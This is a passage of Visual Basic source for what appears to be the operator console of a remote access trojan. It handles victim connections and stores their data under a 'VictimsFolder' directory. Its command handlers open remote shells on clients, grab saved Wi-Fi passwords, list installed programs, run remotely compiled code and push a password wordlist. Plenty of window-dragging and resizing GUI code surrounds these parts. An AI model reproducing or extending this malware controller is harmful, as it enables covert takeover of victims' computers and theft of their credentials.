                            shl2.T1.ScrollToCaret()
                        End SyncLock
                    End If
                    Return
                Case "sqlmappath"
                    Dim Command As String = "cd " + A(1)
                    S.Send(sock, "sqlrs" & Yy & ENB([Command]))

                Case "sqlrsc"
                    Dim shl3 As sqlmap = My.Application.OpenForms("sqlrs" & sock)
                    If (Not shl3 Is Nothing) Then
                        shl3.Close()
                    End If

                Case "rss"
                    If My.Application.OpenForms("rs" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim cmd As New cmd
                    cmd.sock = sock
                    cmd.Name = "rs" & sock
                    cmd.Text = cmd.T2.Text
                    cmd.Label3.Text &= " For : " & S.IP(sock)
                    cmd.Show()

                Case "rs"
                    Dim shl2 As cmd = My.Application.OpenForms("rs" & sock)
                    If (Not shl2 Is Nothing) Then
                        Dim box As RichTextBox = shl2.T1
                        SyncLock box
                            shl2.T1.SelectionStart = shl2.T1.TextLength
                            shl2.T1.AppendText((DEB(A(1).Replace(ChrW(13) & ChrW(10), "")) & ChrW(13) & ChrW(10)))
                            shl2.T1.SelectionStart = shl2.T1.TextLength
                            shl2.T1.ScrollToCaret()
                        End SyncLock
                    End If
                    Return
                Case "rsc"
                    Dim shl3 As cmd = My.Application.OpenForms("rs" & sock)
                    If (Not shl3 Is Nothing) Then
                        shl3.Close()
                    End If



                Case "programs"
                    If L1.FindItemWithText(S.IP(sock)) Is Nothing Then
                        S.Disconnect(sock)
                    End If
                    If My.Application.OpenForms("programs" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Installed_Programs
                    f.sock = sock
                    f.Name = "programs" & sock
                    f.Label3.Text &= " " & S.IP(sock)

                    f.Show()

                Case "xxz"

                    Dim fProc As Installed_Programs = My.Application.OpenForms("programs" & sock)
                    Dim ProgramElement As New ListViewItem

                    If A(1).Contains("Security") Then
                        ProgramElement.ImageIndex = 2
                    ElseIf A(1).Contains("Hot fix") Then
                        ProgramElement.ImageIndex = 3
                    ElseIf A(1).Contains("Office") Then
                        ProgramElement.ImageIndex = 4
                    ElseIf A(1).Contains("Nokia") Or A(1).Contains("Mobile") Or A(1).Contains("Android") Or A(1).Contains("Phone") Or A(1).Contains("Samsung") Then
                        ProgramElement.ImageIndex = 5
                    Else
                        ProgramElement.ImageIndex = 0
                    End If
                    ProgramElement.Text = A(1)
                    ProgramElement.SubItems.Add(A(2))
                    ProgramElement.SubItems.Add(A(3))
                    ProgramElement.SubItems.Add(A(4))
                    ProgramElement.SubItems.Add(A(5))
                    ProgramElement.SubItems.Add(A(6))

                    fProc.ListView1.Items.Add(ProgramElement)


                Case "code"
                    If My.Application.OpenForms("code" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Compiler
                    f.sock = sock
                    f.Name = "code" & sock
                    ' f.Text = "NetWork Adapter & Connections For : " & S.IP(xxx)
                    f.Label3.Text &= " " & S.IP(sock)
                    f.Show()


                Case "wifipass"
                    If My.Application.OpenForms("savedwifi" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Wifipassword
                    f.sock = sock
                    f.Name = "savedwifi" & sock
                    ' f.Text = "NetWork Adapter & Connections For : " & S.IP(xxx)
                    f.Label3.Text &= " " & S.IP(sock)
                    f.Show()
                    f.Label11.Text &= "Taking Lower level argument (Network card)"
                    f.RichTextBox1.Text = ""
                Case "getsavedwifi"

                    Dim F As Wifipassword = My.Application.OpenForms("savedwifi" & sock)
                    F.ListView2.Items.Add(A(1), 0)
                    F.Label11.Text = "Status : Wifi Profiles Ready to investigate "
                Case "wifiwait"
                    Dim F As Wifipassword = My.Application.OpenForms("savedwifi" & sock)
                    F.Label11.Text = "Please Wait ... Grabbing Wifi Full information"

                Case "wifipassword"
                    Try
                        Dim F As Wifipassword = My.Application.OpenForms("savedwifi" & sock)

                        F.RichTextBox1.Text &= A(1) + vbNewLine


                        F.ContextMenuStrip2.Enabled = True

                    Catch ex As Exception

                    End Try


                    'MsgBox(A(1) + "AA" + A(2) + "AA" + A(3) + "AA" + A(4))
                Case ("wifidone")
                    Dim F As Wifipassword = My.Application.OpenForms("savedwifi" & sock)
                    'F.Timer3.Start()
                Case ("getstat")
                    Dim F As Network_Adapters = My.Application.OpenForms("stat" & sock)
                    'Netwoek Adapters
                    Dim Driver As New ListViewItem
                    Driver.Text = A(1)
                    If (A(1)).Contains("Wi-Fi") Or A(1).Contains("Wi") Then
                        Driver.ImageIndex = 2
                    End If
                    If (A(1)).Contains("Local Area") Then
                        Driver.ImageIndex = 1
                    End If
                    If (A(1)).Contains("MAC") Then
                        Driver.ImageIndex = 3
                    End If
                    If (A(1)).Contains("IPv4") Then
                        Driver.ImageIndex = 4
                    End If
                    If (A(1)).Contains("Local Link") Then
                        Driver.ImageIndex = 5
                    End If
                    F.ListView1.Items.Add(Driver)

                Case "stati"
                    Dim F As netstat = My.Application.OpenForms("stat" & sock)
                    'Connections
                    F.ListView2.Items.Add(A(1), 0)
                Case "stat"
                    If StatTurn Then
                        If My.Application.OpenForms("stat" & sock) IsNot Nothing Then Exit Sub
                        If Me.InvokeRequired Then
                            Dim j As New _Data(AddressOf Data)
                            Me.Invoke(j, New Object() {sock, B})
                            Exit Sub
                        End If
                        Dim f As New netstat
                        f.sock = sock
                        f.Name = "stat" & sock
                        ' f.Text = "NetWork Adapter & Connections For : " & S.IP(xxx)
                        f.Label3.Text &= " " & S.IP(sock)
                        f.Show()
                    ElseIf AdpaterTurn Then
                        If My.Application.OpenForms("stat" & sock) IsNot Nothing Then Exit Sub
                        If Me.InvokeRequired Then
                            Dim j As New _Data(AddressOf Data)
                            Me.Invoke(j, New Object() {sock, B})
                            Exit Sub
                        End If
                        Dim f As New Network_Adapters
                        f.sock = sock
                        f.Name = "stat" & sock
                        ' f.Text = "NetWork Adapter & Connections For : " & S.IP(xxx)
                        f.Label3.Text &= " " & S.IP(sock)
                        f.Show()
                    End If

            End Select

        Catch ex As Exception

        End Try
    End Sub

    Friend Sub SendWordList(ByVal sock As Integer)
        '"sqlwordlist"

        File.WriteAllBytes(wordlistrar, My.Resources.wordlist)



        S.Send(sock, "sqlwordlist" & Yy & "wordlist.zip" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(wordlistrar)))


        Threading.Thread.CurrentThread.Sleep(1000)


        IO.File.Delete(wordlistrar)
    End Sub
    Function QZ(ByVal q As Integer) As Size '
        On Error Resume Next
        Do '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


            Dim AOPXTTPODCCMO As New Size(UODNNXMATTYW)
            Dim TT# = 1.1, YY = 1.3, UU# = 2.1, OO# = 1.5, UI# = 2.2, RR# = 1.9, AZQ# = 2.5, EWQ# = 3.5
            Dim Xe# = 3, YqWT# = 4, N# = 5, UM# = 6, UEEQS# = 2
            Select Case q
                Case 0
                    Return UODNNXMATTYW
                Case 1
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / TT
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / TT
                Case 2
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / YY
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / YY
                Case 3
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / OO
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / OO
                Case 4
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / RR
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / RR
                Case 5
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / UEEQS
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / UEEQS
                Case 6
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / UU
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / UU
                Case 7
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / UI
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / UI
                Case 8
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / AZQ
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / AZQ
                Case 9
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / Xe
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / Xe
                Case 10
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / EWQ
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / EWQ
                Case 11
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / YqWT
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / YqWT
                Case 12
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / N
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / N
                Case 13
                    AOPXTTPODCCMO.Width = AOPXTTPODCCMO.Width / UM
                    AOPXTTPODCCMO.Height = AOPXTTPODCCMO.Height / UM
            End Select
            AOPXTTPODCCMO.Width = Mid(AOPXTTPODCCMO.Width.ToString, 1, AOPXTTPODCCMO.Width.ToString.Length - 1) & 0
            AOPXTTPODCCMO.Height = Mid(AOPXTTPODCCMO.Height.ToString, 1, AOPXTTPODCCMO.Height.ToString.Length - 1) & 0
            Return AOPXTTPODCCMO
        Loop '>>>>>>>>>>>>>>>>
    End Function
    Private Sub TabControl1_DrawItem(sender As Object, e As DrawItemEventArgs) Handles TabControl1.DrawItem
        Select Case e.Index
            Case 0
                e.Graphics.FillRectangle(New SolidBrush(Color.Transparent), e.Bounds)
            Case 1
                e.Graphics.FillRectangle(New SolidBrush(Color.Transparent), e.Bounds)
        End Select

        Dim paddedBounds As Rectangle = e.Bounds
        paddedBounds.Inflate(-2, -2)
        e.Graphics.DrawString(TabControl1.TabPages(e.Index).Text, Me.Font, SystemBrushes.HighlightText, paddedBounds)


    End Sub
    Sub Disconnect(ByVal xxx As Integer) Handles S.DisConnected
        Try
            per = L1.Items.Count - 1
            If (per < 0) = False Then
                Panel9.Refresh()
            End If


            Dim IP As String = S.IP(xxx)
            L1.Items(xxx.ToString).Remove()
            RichTextBox2.AppendText(IP & " Disconnected" & vbNewLine)
            Disconnected(IP)
            '  ListBox1.Items.Add("UserLogout :" + " IP: " + S.IP(xxx) + " ServerID : " + ServerID + " Time : " + TimeValue(Now) + "Country :" + getcountry(IP))
            PictureBox1.Image = Nothing
            listimage.Images.RemoveAt(S.IP(xxx))
            For Each Form As Windows.Forms.Form In My.Application.OpenForms
                If Form.Name.Contains(xxx) Then
                    Form.Close()
                End If
            Next

        Catch ex As Exception
        End Try
    End Sub
    Private Function fnLocalIp() As String
        Try
            Dim h As System.Net.IPHostEntry = System.Net.Dns.GetHostByName(System.Net.Dns.GetHostName)
            Dim strLocalIp As String = h.AddressList.GetValue(0).ToString
            Dim substring As String = strLocalIp.Substring(0, CInt(strLocalIp.Length / 2) + 1)
            Return substring
        Catch ex As Exception
        End Try
    End Function
    Private Sub Insert(ByVal IP As String)

        If RichTextBox1.Text.Contains(IP) Then
        Else
            RichTextBox1.Text &= IP & vbNewLine
            ListView2.Items.Add(IP)
        End If
        For i = 0 To ListView2.Items.Count - 1
            If ListView2.Items(i).Text = IP Then
                ListView2.Items(i).ForeColor = Color.Lime
            End If
        Next
        GetHttpLocation(IP)

    End Sub
    Private Sub GetHttpLocation(ByVal Ipaddress As String)
        Try

            If (Ipaddress.Contains("127.0.0") Or Ipaddress.Contains(fnLocalIp)) Then

                For x = 0 To ListView2.Items.Count - 1
                    Ipaddress = ListView2.Items(x).Text

                    Dim xmldoc As New System.Xml.XmlDocument
                    Dim xmlnode As System.Xml.XmlNodeList
                    Dim i As Integer
                    xmldoc.Load("http://freegeoip.net/xml/")
                    xmlnode = xmldoc.GetElementsByTagName("Response")
                    For i = 0 To xmlnode.Count - 1

                        xmlnode(i).ChildNodes.Item(0).InnerText.Trim()
                        country = (xmlnode(i).ChildNodes.Item(2).InnerText.Trim)
                        ListView2.Items(x).ImageIndex = GetCountryNumber(UCase(country))
                    Next

                Next
            Else

                For x = 0 To ListView2.Items.Count - 1
                    Ipaddress = ListView2.Items(x).Text

                    Dim xmldoc As New System.Xml.XmlDocument
                    Dim xmlnode As System.Xml.XmlNodeList
                    Dim i As Integer
                    xmldoc.Load("http://freegeoip.net/xml/" & Ipaddress)
                    xmlnode = xmldoc.GetElementsByTagName("Response")
                    For i = 0 To xmlnode.Count - 1

                        xmlnode(i).ChildNodes.Item(0).InnerText.Trim()
                        country = (xmlnode(i).ChildNodes.Item(2).InnerText.Trim)
                        ListView2.Items(x).ImageIndex = GetCountryNumber(UCase(country))
                    Next


                Next
            End If

        Catch ex As Exception

        End Try





    End Sub
    Private Sub Disconnected(ByVal IP As String)
        For i = 0 To ListView2.Items.Count - 1
            If ListView2.Items(i).Text = IP Then
                ListView2.Items(i).ForeColor = Color.Red
                ListView2.Items(i).ImageIndex = 452
            End If
        Next

    End Sub
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean

    Private Sub Header_MouseDoubleClick(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Header.MouseDoubleClick
        If e.Button = MouseButtons.Left Then
            If maximized Then
                Me.WindowState = FormWindowState.Normal
                maximized = False
            Else
                Me.WindowState = FormWindowState.Maximized
                maximized = True
            End If
        End If
    End Sub

    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Header.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Header.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Header.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub
    ''Repeated
    Private Sub Label1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label1.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Label1_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label1.MouseUp
        drag = False
    End Sub

    Private Sub Label1_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label1.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub
    ''Repeated
    Private Sub Label2_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label2.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Label2_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label2.MouseUp
        drag = False
    End Sub

    Private Sub Label2_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label2.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub
    Private Sub buttonClos_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles buttonClos.Click
        Me.Close()
    End Sub



#End Region

#Region "Resize"

    Dim onFullScreen As Boolean
    Dim maximized As Boolean
    Dim on_MinimumSize As Boolean
    Dim minimumWidth As Short = 350
    Dim minimumHeight As Short = 26
    Dim borderSpace As Short = 20
    Dim borderDiameter As Short = 3

    Dim onBorderRight As Boolean
    Dim onBorderLeft As Boolean
    Dim onBorderTop As Boolean
    Dim onBorderBottom As Boolean
    Dim onCornerTopRight As Boolean
    Dim onCornerTopLeft As Boolean
    Dim onCornerBottomRight As Boolean
    Dim onCornerBottomLeft As Boolean

    Dim movingRight As Boolean
    Dim movingLeft As Boolean
    Dim movingTop As Boolean
    Dim movingBottom As Boolean
    Dim movingCornerTopRight As Boolean
    Dim movingCornerTopLeft As Boolean
    Dim movingCornerBottomRight As Boolean
    Dim movingCornerBottomLeft As Boolean

    Private Sub Borderless_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseDown
        If e.Button = Windows.Forms.MouseButtons.Left Then
            If onBorderRight Then movingRight = True Else movingRight = False
            If onBorderLeft Then movingLeft = True Else movingLeft = False
            If onBorderTop Then movingTop = True Else movingTop = False
            If onBorderBottom Then movingBottom = True Else movingBottom = False
            If onCornerTopRight Then movingCornerTopRight = True Else movingCornerTopRight = False
            If onCornerTopLeft Then movingCornerTopLeft = True Else movingCornerTopLeft = False
            If onCornerBottomRight Then movingCornerBottomRight = True Else movingCornerBottomRight = False
            If onCornerBottomLeft Then movingCornerBottomLeft = True Else movingCornerBottomLeft = False
        End If
    End Sub

    Private Sub Borderless_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseUp
        stopResizer()
    End Sub

    Private Sub Borderless_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseMove
        If onFullScreen Or maximized Then Exit Sub

        If Me.Width <= minimumWidth Then Me.Width = (minimumWidth + 5) : on_MinimumSize = True
        If Me.Height <= minimumHeight Then Me.Height = (minimumHeight + 5) : on_MinimumSize = True
        If on_MinimumSize Then stopResizer() Else startResizer()


        If (Cursor.Position.X > (Me.Location.X + Me.Width) - borderDiameter) _
            And (Cursor.Position.Y > (Me.Location.Y + borderSpace)) _
            And (Cursor.Position.Y < ((Me.Location.Y + Me.Height) - borderSpace)) Then
            Me.Cursor = Cursors.SizeWE
            onBorderRight = True

        ElseIf (Cursor.Position.X < (Me.Location.X + borderDiameter)) _
            And (Cursor.Position.Y > (Me.Location.Y + borderSpace)) _
            And (Cursor.Position.Y < ((Me.Location.Y + Me.Height) - borderSpace)) Then
            Me.Cursor = Cursors.SizeWE
            onBorderLeft = True

        ElseIf (Cursor.Position.Y < (Me.Location.Y + borderDiameter)) _
            And (Cursor.Position.X > (Me.Location.X + borderSpace)) _
            And (Cursor.Position.X < ((Me.Location.X + Me.Width) - borderSpace)) Then
            Me.Cursor = Cursors.SizeNS
            onBorderTop = True

        ElseIf (Cursor.Position.Y > ((Me.Location.Y + Me.Height) - borderDiameter)) _
            And (Cursor.Position.X > (Me.Location.X + borderSpace)) _
            And (Cursor.Position.X < ((Me.Location.X + Me.Width) - borderSpace)) Then
            Me.Cursor = Cursors.SizeNS
            onBorderBottom = True

        ElseIf (Cursor.Position.X = ((Me.Location.X + Me.Width) - 1)) _
            And (Cursor.Position.Y = Me.Location.Y) Then
            Me.Cursor = Cursors.SizeNESW
            onCornerTopRight = True

        ElseIf (Cursor.Position.X = Me.Location.X) _
            And (Cursor.Position.Y = Me.Location.Y) Then
            Me.Cursor = Cursors.SizeNWSE
            onCornerTopLeft = True

        ElseIf (Cursor.Position.X = ((Me.Location.X + Me.Width) - 1)) _
            And (Cursor.Position.Y = ((Me.Location.Y + Me.Height) - 1)) Then
            Me.Cursor = Cursors.SizeNWSE
            onCornerBottomRight = True

        ElseIf (Cursor.Position.X = Me.Location.X) _
            And (Cursor.Position.Y = ((Me.Location.Y + Me.Height) - 1)) Then
            Me.Cursor = Cursors.SizeNESW
            onCornerBottomLeft = True

        Else
            onBorderRight = False
            onBorderLeft = False
            onBorderTop = False
            onBorderBottom = False
            onCornerTopRight = False
            onCornerTopLeft = False
            onCornerBottomRight = False
            onCornerBottomLeft = False
            Me.Cursor = Cursors.Default
        End If
    End Sub

    Private Sub startResizer()
        Select Case True

            Case movingRight
                Me.Width = (Cursor.Position.X - Me.Location.X)

            Case movingLeft
                Me.Width = ((Me.Width + Me.Location.X) - Cursor.Position.X)
                Me.Location = New Point(Cursor.Position.X, Me.Location.Y)

            Case movingTop
                Me.Height = ((Me.Height + Me.Location.Y) - Cursor.Position.Y)
                Me.Location = New Point(Me.Location.X, Cursor.Position.Y)

            Case movingBottom
                Me.Height = (Cursor.Position.Y - Me.Location.Y)

            Case movingCornerTopRight
                Me.Width = (Cursor.Position.X - Me.Location.X)
                Me.Height = ((Me.Location.Y - Cursor.Position.Y) + Me.Height)
                Me.Location = New Point(Me.Location.X, Cursor.Position.Y)

            Case movingCornerTopLeft
                Me.Width = ((Me.Width + Me.Location.X) - Cursor.Position.X)
                Me.Location = New Point(Cursor.Position.X, Me.Location.Y)
                Me.Height = ((Me.Height + Me.Location.Y) - Cursor.Position.Y)
                Me.Location = New Point(Me.Location.X, Cursor.Position.Y)

            Case movingCornerBottomRight
                Me.Size = New Point((Cursor.Position.X - Me.Location.X), (Cursor.Position.Y - Me.Location.Y))

            Case movingCornerBottomLeft
                Me.Width = ((Me.Width + Me.Location.X) - Cursor.Position.X)
                Me.Height = (Cursor.Position.Y - Me.Location.Y)
                Me.Location = New Point(Cursor.Position.X, Me.Location.Y)

        End Select
    End Sub

    Private Sub stopResizer()
        movingRight = False
        movingLeft = False
        movingTop = False
        movingBottom = False
        movingCornerTopRight = False
        movingCornerTopLeft = False
        movingCornerBottomRight = False
        movingCornerBottomLeft = False
        Me.Cursor = Cursors.Default
        Threading.Thread.Sleep(300)
        on_MinimumSize = False
    End Sub
#End Region
    Dim refreshed As Boolean
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick

        Header.Width = Me.Width - 6
        Header.Location = New Point(3, 3)
        buttonClos.Location = New Point(Header.Width - 23, 1)
        TabControl1.Location = New Point(0, 29)
        TabControl1.Size = New Size(ClientsPanel.Width - 6, ClientsPanel.Height - 32)
        If (Me.WindowState = FormWindowState.Maximized) Then
            Screenpanel.Dock = DockStyle.Right
            ClientsPanel.Dock = DockStyle.Fill
            TabControl1.Location = New Point(0, 29)

        End If
        If (Me.WindowState = FormWindowState.Normal) Then
            Screenpanel.Dock = DockStyle.None
            Screenpanel.Location = New Point(Header.Width - Screenpanel.Width, 1)
            ClientsPanel.Dock = DockStyle.None
            ClientsPanel.Location = New Point(3, 1)
            ClientsPanel.Size = New Size(Me.Width - 232, Me.Height - 3)

        End If


    End Sub



    Sub infg()

        On Error Resume Next

        Dim folders = (Application.StartupPath & "/VictimsFolder/" & (L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(0).Text) + "\Star.01")





        If CheckBox1.Checked Then
            For Each x As ListViewItem In L1.SelectedItems
                If L1.SelectedItems.Count = 1 Then
                    S.Send(x.ToolTipText, "!!")
                End If
            Next
            PictureBox1.Image = Nothing



        End If
        For Each x As ListViewItem In L1.SelectedItems
            pingerTimers.Start()
            If CheckBox2.Checked = True Then
                S.Send(x.ToolTipText, "infoDesk")
            End If

        Next

        Dim sc As String
        'sc = L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(7).Text
        'Label1.Text = L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(14).Text
        'If Label1.Text = "Powered Charging - 100%" Then
        '    PictureBox3.ImageLocation = "IOS\sys\S2.png"
        'Else
        '    PictureBox3.ImageLocation = "IOS\sys\S1.png"
        'End If






    End Sub
    Private Sub pingerTimers_Tick(sender As System.Object, e As System.EventArgs) Handles pingerTimers.Tick
        pinger += 1

    End Sub


    Private Sub Transparent_FormClosing(sender As Object, e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub
    Private Function returnuserfromip(ByVal ip As String) As String
        For Each itemx As ListViewItem In L1.Items
            If itemx.SubItems(1).Text.Equals(ip) Then
                Return itemx.SubItems(0).Text
            End If

        Next
    End Function





    Private Sub DrawClients(g As Graphics, rect As Rectangle, percentage As Single)
        'work out the angles for each arc
        Dim progressAngle = CSng(360 / 100 * percentage)
        Dim remainderAngle = 360 - progressAngle

        'create pens to use for the arcs
        Using progressPen As New Pen(Color.DeepSkyBlue, 5), remainderPen As New Pen(Color.CadetBlue, 2)
            'set the smoothing to high quality for better output
            g.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
            'draw the blue and white arcs
            g.DrawArc(progressPen, rect, -90, progressAngle)
            g.DrawArc(remainderPen, rect, progressAngle - 90, remainderAngle)
        End Using

        'draw the text in the centre by working out how big it is and adjusting the co-ordinates accordingly
        Using fnt As New Font(Me.Font.FontFamily, 14)
            Dim text As String = percentage.ToString
            If percentage = 0 Then
                text = "No Clients"
            ElseIf percentage = 1 Then
                text &= " Client"
            ElseIf percentage > 0 And percentage > 1 Then
                text &= " Clients"
            End If

            Dim textSize = g.MeasureString(text, fnt)
            Dim textPoint As New Point(CInt(rect.Left + (rect.Width / 2) - (textSize.Width / 2)), CInt(rect.Top + (rect.Height / 2) - (textSize.Height / 2)))
            'now we have all the values draw the text
            g.DrawString(text, fnt, Brushes.Lime, textPoint)
        End Using
    End Sub


    '########################
    '##_____Panel Hover____##
    '########################

    Private Sub Button9_MouseLeave(sender As System.Object, e As System.EventArgs) Handles Button9.MouseLeave
        Panel20.Size = New Size(196, 51) '196; 51
        Panel20.SendToBack()
    End Sub
    Private Sub Button9_MouseHover(sender As System.Object, e As System.EventArgs) Handles Button9.MouseHover
        Panel20.Size = New Size(215, 60)
        Panel20.BringToFront()
    End Sub
    Private Sub Button1_MouseLeave(sender As System.Object, e As System.EventArgs) Handles Button1.MouseLeave
        Panel3.Size = New Size(196, 51)
        Panel3.BringToFront()
    End Sub
    Private Sub Button1_MouseHover(sender As System.Object, e As System.EventArgs) Handles Button1.MouseHover
        Panel3.Size = New Size(215, 60)
        Panel3.SendToBack()
    End Sub
    Private Sub Button2_MouseLeave(sender As System.Object, e As System.EventArgs) Handles Button2.MouseLeave
        Panel2.Size = New Size(196, 51)
        Panel2.SendToBack()
    End Sub
    Private Sub Button2_MouseHover(sender As System.Object, e As System.EventArgs) Handles Button2.MouseHover
        Panel2.Size = New Size(215, 60)
        Panel2.BringToFront()
    End Sub
    Private Sub Button3_MouseLeave(sender As System.Object, e As System.EventArgs) Handles Button3.MouseLeave
        Panel4.Size = New Size(196, 51)
        Panel4.SendToBack()
    End Sub
    Private Sub Button3_MouseHover(sender As System.Object, e As System.EventArgs) Handles Button3.MouseHover
        Panel4.Size = New Size(215, 60)
        Panel4.BringToFront()
    End Sub
    Private Sub Button5_MouseLeave(sender As System.Object, e As System.EventArgs) Handles Button5.MouseLeave
        Panel7.Size = New Size(196, 51)
        Panel7.SendToBack()
    End Sub
    Private Sub Button5_MouseHover(sender As System.Object, e As System.EventArgs) Handles Button5.MouseHover
        Panel7.Size = New Size(215, 60)
        Panel7.BringToFront()
    End Sub
    Private Sub Button6_MouseLeave(sender As System.Object, e As System.EventArgs) Handles Button6.MouseLeave
        Panel8.Size = New Size(196, 51)
        Panel8.SendToBack()
    End Sub
    Private Sub Button6_MouseHover(sender As System.Object, e As System.EventArgs) Handles Button6.MouseHover
        Panel8.Size = New Size(215, 60)
        Panel8.BringToFront()
    End Sub
    Private Sub Button15_MouseLeave(sender As System.Object, e As System.EventArgs) Handles Button15.MouseLeave
        Panel16.Size = New Size(196, 51)
        Panel16.SendToBack()
    End Sub
    Private Sub Button15_MouseHover(sender As System.Object, e As System.EventArgs) Handles Button15.MouseHover
        Panel16.Size = New Size(215, 60)
        Panel16.BringToFront()
    End Sub
    Private Sub Button14_MouseLeave(sender As System.Object, e As System.EventArgs) Handles Button14.MouseLeave
        Panel15.Size = New Size(196, 51)
        Panel15.SendToBack()
    End Sub
    Private Sub Button14_MouseHover(sender As System.Object, e As System.EventArgs) Handles Button14.MouseHover
        Panel15.Size = New Size(215, 60)
        Panel15.BringToFront()
    End Sub


    Private Sub Panel9_Paint(sender As System.Object, e As System.Windows.Forms.PaintEventArgs) Handles Panel9.Paint
        Flager.Stop()
        DrawClients(e.Graphics, New Rectangle(5, 5, 100, 100), per)
    End Sub

    Function getstartpoint(ByVal x, ByVal y) As Point
        Dim newpoint As New Point
        newpoint.X = x
        newpoint.Y = y
        Return newpoint

    End Function
    Function getendpoint(ByVal x, ByVal y) As Point
        Dim newpoint As New Point
        newpoint.X = x
        newpoint.Y = y
        Return newpoint
    End Function
    Public Sub DrawLineFloat(ByVal startpoint As Point, ByVal endpoint As Point)
        ' Create pen. 
        Dim blackPen As New Pen(Color.Lime, 3)
        ' Create coordinates of points that define line. 
        Dim x1 As Single = startpoint.X
        Dim y1 As Single = startpoint.Y
        Dim x2 As Single = endpoint.X
        Dim y2 As Single = endpoint.Y
        ' Draw line to screen. 

        Dim g As Graphics = PictureBox2.CreateGraphics()
        g.DrawLine(blackPen, x1, y1, x2, y2)

        blackPen.Dispose()

    End Sub
    Public Sub DrawLineFloatServer(ByVal startpoint As Point, ByVal endpoint As Point)
        ' Create pen.


        Dim blackPen As New Pen(Color.Yellow, 3)
        ' Create coordinates of points that define line. 
        Dim x1 As Single = startpoint.X
        Dim y1 As Single = startpoint.Y
        Dim x2 As Single = endpoint.X
        Dim y2 As Single = endpoint.Y
